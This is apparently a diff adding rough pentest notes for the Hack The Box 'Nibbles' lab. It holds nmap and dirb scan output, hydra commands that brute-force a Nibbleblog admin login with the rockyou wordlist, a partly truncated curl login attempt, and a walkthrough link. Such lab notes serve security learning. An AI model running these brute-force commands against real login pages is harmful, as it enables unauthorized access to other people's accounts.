@@ -1,0 +1,30 @@
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+- Dirb
++ http://10.129.96.84/index.html (CODE:200|SIZE:93)
++ http://10.129.96.84/server-status (CODE:403|SIZE:300)
+
+
+
+hydra -l dignajar -P /usr/share/wordlists/rockyou.txt $target/nibbleblog HTTP-FORM-POST "/admin.php:username=^USER^&password=^PASS^:F=Incorrect" -Vv -f
+
+
+hydra -l dignajar -P /usr/share/wordlists/rockyou.txt $target http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect" -Vv -f
+
+
+
+username=^USER^&password=^PASS^:F=incorrect"-v -f
+
+curl 'http://10.129.96.84/nibbleblog/admin.php' \
+
+  0.0 Safari/537.36' \
+  --data-raw 'username=dignajar&password=12345' \
+  --compressed \
+  --insecure
+
+  https://medium.com/@ann_17/nibbles-hack-the-box-walkthrough-without-metasploit-88a921ec6fac
